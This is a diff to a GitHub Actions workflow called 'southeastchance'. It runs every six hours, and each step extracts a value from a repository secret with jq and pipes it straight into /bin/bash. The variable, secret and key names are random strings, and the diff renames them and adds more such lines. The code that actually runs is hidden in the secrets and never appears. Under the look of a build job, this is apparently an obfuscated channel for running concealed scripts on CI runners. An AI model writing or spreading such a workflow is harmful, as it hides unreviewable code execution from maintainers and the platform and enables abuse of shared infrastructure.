@@ -2,9 +2,9 @@ name: southeastchance
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 3/6 * * *'
+    - cron: '44 1/6 * * *'
 
-jobs:  # 12301
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,11 +12,17 @@ jobs:  # 12301
       - uses: actions/checkout@v4
       - name: southeastchance
         env:
-          wtfx2172: ${{ secrets.wtfx2172 }}
+          hjgs96641: ${{ secrets.hjgs96641 }}
         run: |
-          echo $wtfx2172 | jq -r .tkcw52734 | /bin/bash
-          echo $xaf61395 | jq -r .uivog70127 | /bin/bash
-          echo $iutqs413 | jq -r .awfel128 | /bin/bash
-          echo $rxxv527 | jq -r .pi85 | /bin/bash
-          echo $jd7278 | jq -r .tk05 | /bin/bash
+          echo $hjgs96641 | jq -r .dwu431 | /bin/bash
+          echo $x1 | jq -r .oc647 | /bin/bash
+          echo $c23 | jq -r .yhl7198 | /bin/bash
+          echo $so5288 | jq -r .r18 | /bin/bash
+          echo $xrzg658 | jq -r .ky77 | /bin/bash
+          echo $mqy4 | jq -r .ekuu42137 | /bin/bash
+          echo $bmuf35 | jq -r .otl631 | /bin/bash
+          echo $fxa1735 | jq -r .mbzd81098 | /bin/bash
+          echo $cckro721 | jq -r .s10417 | /bin/bash
+          echo $fcwc48877 | jq -r .hyv99 | /bin/bash
+          echo $qu91817 | jq -r .ee96 | /bin/bash
 
